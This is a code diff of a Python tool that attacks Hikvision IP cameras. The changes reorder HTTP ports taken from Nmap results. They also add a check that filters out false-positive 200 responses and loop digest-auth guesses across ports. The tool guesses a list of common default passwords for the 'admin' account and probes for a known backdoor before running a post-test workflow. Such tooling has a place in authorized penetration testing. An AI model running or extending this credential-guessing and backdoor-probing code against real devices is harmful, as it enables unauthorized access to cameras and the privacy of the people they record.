@@ -65,13 +65,13 @@ def _ports_for_host(host: str) -> list[int]:
     import os
 
     from core.paths import project_root
-    from core.workspace_ports import load_open_ports_from_workspace, prefer_web_ports
+    from core.workspace_ports import load_open_ports_from_workspace, prefer_hikvision_http_ports
 
     td = os.environ.get("ENGINE_WORKSPACE") or os.path.join(project_root(), "targets", host)
     cached = load_open_ports_from_workspace(td)
     if cached:
-        return prefer_web_ports(cached, camera_first=True)
-    return [80, 8000]
+        return prefer_hikvision_http_ports(cached)
+    return [8000, 80]
 
 
 def test_backdoor(host: str, port: int = 80) -> dict:
@@ -138,11 +138,22 @@ def test_digest_login(host: str, username: str, password: str, port: int = 80) -
 
 def test_basic_login(host: str, username: str, password: str, port: int = 80) -> dict:
     """Basic auth (usually fails on Hikvision — included to show the difference)."""
+    from engines.hikvision_snapshots import is_isapi_xml
+
     base = _base_url(host, port)
     session = _session()
     try:
         r = session.get(f"{base}/ISAPI/Security/userCheck", auth=(username, password), timeout=12)
-        return {"valid": r.status_code == 200, "status": r.status_code, "method": "HTTP Basic"}
+        real = r.status_code == 200 and is_isapi_xml(r.content)
+        note = ""
+        if r.status_code == 200 and not real:
+            note = "HTTP 200 but HTML shell — NOT valid ISAPI (misleading on port 80)"
+        return {
+            "valid": real,
+            "status": r.status_code,
+            "method": "HTTP Basic",
+            "note": note,
+        }
     except requests.RequestException as exc:
         return {"valid": False, "error": str(exc), "method": "HTTP Basic"}
 
@@ -176,7 +187,9 @@ def main() -> int:
     http_ports = _ports_for_host(host)
     primary_port = http_ports[0]
     if len(http_ports) > 1:
-        print(f"[*] Nmap workspace ports: {http_ports} — testing HTTP on {primary_port} first")
+        print(f"[*] Nmap workspace ports: {http_ports} — Hikvision HTTP priority: {primary_port} first")
+        if 80 in http_ports and primary_port != 80:
+            print("    (port 80 may be ZyXEL/router front — ISAPI often on 8000)")
 
     print("=" * 70)
     print(f"  HIKVISION CREDENTIAL TEST — {host}")
@@ -203,20 +216,26 @@ def main() -> int:
     candidates = [ROUTER_SCAN_PASSWORD, "12345", "123456", "12345678", "admin"]
     if args.password:
         candidates.insert(0, args.password)
-    seen = set()
+    seen: set[str] = set()
     found_real = None
+    digest_port = primary_port
     for pw in candidates:
         if pw in seen:
             continue
         seen.add(pw)
-        result = test_digest_login(host, "admin", pw, primary_port)
-        mark = "[+]" if result["valid"] else "[-]"
-        print(f"    {mark} admin:{pw} -> valid={result['valid']}")
-        for check in result["checks"]:
-            if check.get("ok"):
-                print(f"         OK on {check['path']} (HTTP {check['status']})")
-        if result["valid"] and pw != "11":
-            found_real = pw
+        for port in http_ports:
+            result = test_digest_login(host, "admin", pw, port)
+            mark = "[+]" if result["valid"] else "[-]"
+            print(f"    {mark} admin:{pw} @ port {port} -> valid={result['valid']}")
+            for check in result["checks"]:
+                if check.get("ok"):
+                    print(f"         OK on {check['path']} (HTTP {check['status']})")
+            if result["valid"] and pw != "11":
+                found_real = pw
+                digest_port = port
+                primary_port = port
+                break
+        if found_real:
             break
 
     from engines.hikvision_workflow import HikvisionRunContext, probe_backdoor_live, run_post_test_workflow
@@ -225,7 +244,7 @@ def main() -> int:
 
     ctx = HikvisionRunContext(
         host=host,
-        http_port=primary_port,
+        http_port=digest_port if found_real else primary_port,
         http_ports=http_ports,
         backdoor_confirmed=backdoor_ok,
         digest_valid=bool(found_real),
